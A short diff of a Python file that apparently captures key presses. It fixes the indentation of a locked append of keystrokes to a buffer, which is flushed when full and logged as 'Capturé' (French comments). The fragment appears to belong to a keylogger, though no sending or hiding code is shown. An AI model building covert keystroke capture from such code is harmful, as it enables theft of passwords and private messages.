@@ -39,8 +39,8 @@ def onpress(key):
         return
 
 # ── THREAD SAFETY ──────────────────────────────────────
-with lock:
-    buffer.append(key_str) #pour eviter les donner corrompues
+    with lock:
+        buffer.append(key_str) #pour eviter les donner corrompues
     if len(buffer) >= BUFFER_SIZE:
         flush_buffer()
         print("[{timestamp}] Capturé : {key_str}")
